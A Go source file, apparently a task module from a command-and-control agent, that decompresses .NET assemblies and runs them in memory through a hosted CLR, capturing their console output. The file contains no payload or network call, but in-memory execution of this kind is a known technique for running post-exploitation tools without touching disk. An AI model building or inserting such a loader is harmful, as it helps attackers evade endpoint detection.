package tasks

import (
	"bytes"
	"compress/flate"
	"crypto/sha256"
	"fmt"
	clr "github.com/Ne0nd0g/go-clr"
	"io"
	"log"
	"os"
	"runtime"
	"strings"
	"sync"
)

var (
	clrInstance       *CLRInstance
	assemblies        []*assembly
	asmMu             sync.Mutex
	serializeInvokes  = true
	invokeMu          sync.Mutex
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()

	if c.runtimeHost == nil {
		host, err := clr.LoadCLR(runtime)
		if err != nil {
			log.Printf("LoadCLR failed for runtime %q: %v\n", runtime, err)
		}
		c.runtimeHost = host

		if err := clr.RedirectStdoutStderr(); err != nil {
			log.Printf("could not redirect stdout/stderr: %v\n", err)
		}
	}
	return c.runtimeHost
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}

	asmMu.Lock()
	assemblies = append(assemblies, asm)
	asmMu.Unlock()
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	asmMu.Lock()
	defer asmMu.Unlock()
	for _, a := range assemblies {
		if a.hash == asmHash {
			return a
		}
	}
	return nil
}

func drainStdout(methodInfo *clr.MethodInfo, params []string) (string, error) {
	_, _, _ = clr.ReadStdoutStderr()

	stdout0, _ := clr.InvokeAssembly(methodInfo, params)
	out := stdout0

	const maxIters = 2000
	emptyStreak := 0
	for i := 0; i < maxIters; i++ {
		so, _, _ := clr.ReadStdoutStderr()
		if so == "" {
			emptyStreak++
			if emptyStreak >= 2 {
				break
			}
		} else {
			out += so
			emptyStreak = 0
		}
		runtime.Gosched()
	}

	return strings.TrimRight(out, "\r\n"), nil
}

func LoadAssembly(data []byte, params []string, runtimeVer string) (string, error) {
	rtHost := clrInstance.GetRuntimeHost(runtimeVer)
	if rtHost == nil {
		return "", fmt.Errorf("failed to acquire CLR runtime host for %q", runtimeVer)
	}

	var methodInfo *clr.MethodInfo
	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		var err error
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			return "", fmt.Errorf("LoadAssembly failed: %w", err)
		}
		addAssembly(methodInfo, data)
	}

	if len(params) == 1 && params[0] == "" {
		params = []string{" "}
	}

	if serializeInvokes {
		invokeMu.Lock()
		defer invokeMu.Unlock()
	}

	stdout, err := drainStdout(methodInfo, params)
	if err != nil {
		return "", err
	}
	return stdout, nil
}

func ensureWorkDir() {
	// Fall back to %TEMP% (or /tmp) so relative paths won’t fail
	if tmp := os.TempDir(); tmp != "" {
		_ = os.Chdir(tmp)
	}
}

func decompressDeflate(data []byte) ([]byte, error) {
	r := flate.NewReader(bytes.NewReader(data))
	defer r.Close()

	var out bytes.Buffer
	if _, err := io.Copy(&out, r); err != nil {
		return nil, fmt.Errorf("deflate decompression failed: %w", err)
	}
	return out.Bytes(), nil
}

func Runcsharptask(data []byte, params []string) string {
	// 1) Decompress (raw DEFLATE)
	decompressedData, err := decompressDeflate(data)
	if err != nil {
		return fmt.Sprintf("Decompression error: %v", err)
	}

	// 2) Safe working directory for managed code that uses relative paths
	ensureWorkDir()

	// 3) Invoke the in-memory assembly on .NET v4 CLR
	versionString := "v4.0.30319"
	result, err := LoadAssembly(decompressedData, params, versionString)
	if err != nil {
		return fmt.Sprintf("Failed to run assembly")
	}
	return result
}

func RunCsharpTaskInBackground(data []byte, params []string, callback func(string)) {
	go func() {
		decompressedData, err := decompressDeflate(data)
		if err != nil {
			callback(fmt.Sprintf("Decompression error: %v", err))
			return
		}

		ensureWorkDir()

		versionString := "v4.0.30319"
		result, err := LoadAssembly(decompressedData, params, versionString)
		if err != nil {
			callback("Failed to run assembly")
			return
		}
		callback(result)
	}()
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}
